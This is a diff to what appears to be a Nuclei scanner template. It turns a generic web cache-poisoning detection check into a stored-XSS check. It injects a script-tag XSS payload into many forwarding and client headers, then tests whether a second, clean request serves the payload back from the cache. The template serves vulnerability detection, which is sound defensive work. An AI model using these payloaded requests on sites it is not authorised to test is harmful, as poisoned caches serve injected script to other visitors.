@@ -1,46 +1,52 @@
-id: cache-poisoning-2
+id: cache-poisoning-xss
 
 info:
-  name: Cache Poisoning Detection
-  author: erickfernandox
-  severity: low
-  tags: cache,generic
+  name: Cache Poisoning - Stored XSS
+  author: melbadry9,xelkomy,akincibor
+  severity: high
+  description: Cache Poisoning leads to Stored XSS.
+  reference:
+    - https://blog.melbadry9.xyz/fuzzing/nuclei-cache-poisoning
+    - https://portswigger.net/research/practical-web-cache-poisoning
+    - https://portswigger.net/web-security/web-cache-poisoning
   metadata:
-    max-request: 3
-
+    max-request: 2
+  tags: cache,generic,xss
 variables:
   cache_key: "{{to_lower(rand_base(6))}}"
   cache_header: "{{to_lower(rand_base(6))}}"
+  xss_payload: '"></script><script>alert(document.domain);</script>'
 
 http:
   - raw:
       - |
-        GET /?{{cache_key}}=11 HTTP/1.1
+        GET /?{{cache_key}}=1 HTTP/1.1
         Host: {{Hostname}}
-        x-originally-forwarded-for: {{cache_header}}.xfp
-        X-Forwarded: {{cache_header}}.xfa
-        X-Originating-IP: {{cache_header}}.xfq
-        X-Remote-IP: {{cache_header}}.xfr
-        X-Remote-Addr: {{cache_header}}.xfs
-        X-Client-IP: {{cache_header}}.xft
-        X-Proxyuser-IP: {{cache_header}}.xfb
-        X-Original-Url: {{cache_header}}.xfc
-        True-Client-Ip: {{cache_header}}.xfd
-        Cluster-Client-Ip: {{cache_header}}.xfe
-        X-Token: {{cache_header}}.xfg
-        Referer: {{cache_header}}.xfh
-        User-Agent: {{cache_header}}.xfi
-        Cookie: Teste={{cache_header}}.xfj;
-        X-Forwarded-Port: {{cache_header}}.xfl
-        From: {{cache_header}}.xfk
-        Origin: {{cache_header}}.xfm
-
+        x-originally-forwarded-for: {{cache_header}}.xfp{{xss_payload}}
+        X-Forwarded: {{cache_header}}.xfa{{xss_payload}}
+        X-Originating-IP: {{cache_header}}.xfq{{xss_payload}}
+        X-Remote-IP: {{cache_header}}.xfr{{xss_payload}}
+        X-Remote-Addr: {{cache_header}}.xfs{{xss_payload}}
+        X-Client-IP: {{cache_header}}.xft{{xss_payload}}
+        X-Proxyuser-IP: {{cache_header}}.xfb{{xss_payload}}
+        X-Original-Url: {{cache_header}}.xfc{{xss_payload}}
+        True-Client-Ip: {{cache_header}}.xfd{{xss_payload}}
+        Cluster-Client-Ip: {{cache_header}}.xfe{{xss_payload}}
+        X-Token: {{cache_header}}.xfg{{xss_payload}}
+        Referer: {{cache_header}}.xfh{{xss_payload}}
+        User-Agent: {{cache_header}}.xfi{{xss_payload}}
+        Cookie: Teste={{cache_header}}.xfj;{{xss_payload}}
+        X-Forwarded-Port: {{cache_header}}.xfl{{xss_payload}}
+        From: {{cache_header}}.xfk{{xss_payload}}
+        Origin: {{cache_header}}.xfm{{xss_payload}}
 
       - |
-        GET /?{{cache_key}}=11 HTTP/1.1
+        GET /?{{cache_key}}=1 HTTP/1.1
         Host: {{Hostname}}
 
     matchers:
       - type: dsl
         dsl:
-          - 'contains(body_2, cache_header)'
+          - contains(body_2, cache_header)
+          - contains(body_2, xss_payload)
+        condition: and
